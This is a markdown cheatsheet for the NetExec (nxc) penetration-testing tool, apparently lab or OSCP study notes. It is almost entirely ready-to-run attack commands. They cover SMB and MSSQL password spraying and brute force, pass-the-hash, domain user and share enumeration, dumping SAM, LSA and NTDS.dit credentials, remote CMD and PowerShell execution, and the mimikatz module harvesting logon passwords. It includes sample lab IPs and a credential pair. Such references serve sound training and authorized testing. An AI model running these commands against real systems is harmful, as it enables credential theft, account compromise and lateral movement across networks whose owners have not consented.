# nxc (NXC) Cheatsheet
- [nxc](https://github.com/Pennyw0rth/NetExec) 
### Core Usage & Supported Services
- `nxc {smb/winrm/mssql/ldap/ftp/ssh/rdp}`
## 0. Quick Examples
```bash
# Export users list querying DC
nxc smb 10.10.158.140 -u 'Eric.Wallows' -p 'EricLikesRunning800' --users-export ./oscp_users.txt

nxc smb 10.10.158.142 -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares     # share enumerate
nxc smb 10.10.158.142 -u users.txt  -p passwords.txt  --continue-on-success   # password spray

# MSSQL password spray
nxc mssql 10.10.158.142 --local-auth -u 'sa'  -p  /usr/share/wordlists/rockyou.txt  --ignore-pw-decoding


```
## 1. Bruteforce & Authentication
```bash
# Bruteforce attack using user/password files
nxc smb <Rhost/range> -u user.txt -p password.txt --continue-on-success
# Filter for successful logins only
nxc smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]'
# Password spraying (list of users against a single password)
nxc smb <Rhost/range> -u user.txt -p 'password' --continue-on-success
# Use hash instead of password (Pass-the-Hash) for a local account
nxc smb <ip or range> -u username -H <full hash> --local-auth
```
## 2. Enumeration & Discovery (Requires valid credentials)
```bash
# List accessible shares
nxc smb <Rhost/range> -u 'user' -p 'password' --shares
# Build hoss file from DC
nxc smb 192.168.205.172 -u "guest" -p "" --generate-hosts-file ./scans/hosts
# List accessible disks
nxc smb <Rhost/range> -u 'user' -p 'password' --disks
# Enumerate users on the target (best against DC)
nxc smb <DC-IP> -u 'user' -p 'password' --users 
# View active logon sessions
nxc smb <Rhost/range> -u 'user' -p 'password' --sessions
# Dump password policy
nxc smb <Rhost/range> -u 'user' -p 'password' --pass-pol
# Enumerate groups or users in a specific group
nxc smb <Rhost/range> -u 'user' -p 'password' --groups 'Domain Admins'
```
## 3. Credential Dumping (Requires administrative privileges)
```bash
# Dump local SAM hashes
nxc smb <Rhost/range> -u 'user' -p 'password' --sam
# Dump LSA secrets
nxc smb <Rhost/range> -u 'user' -p 'password' --lsa
# Dump NTDS.dit file (from a Domain Controller)
nxc smb <Rhost/range> -u 'user' -p 'password' --ntds
```
## 4. Command Execution (Requires administrative privileges)
```bash
# Execute a CMD command
nxc smb <Rhost/range> -u 'user' -p 'password' -x 'command'
# Execute a PowerShell command
nxc smb <Rhost/range> -u 'user' -p 'password' -X 'powershell command'
```
## 5. Module Usage
```bash
# List all available modules for a service
nxc smb -L 
# Show required options for a module
nxc smb -M mimikatz --options
# Run a module with default settings
nxc smb <Rhost> -u 'user' -p 'password' -M mimikatz
# Run a module with specific options
nxc smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='sekurlsa::logonpasswords'

```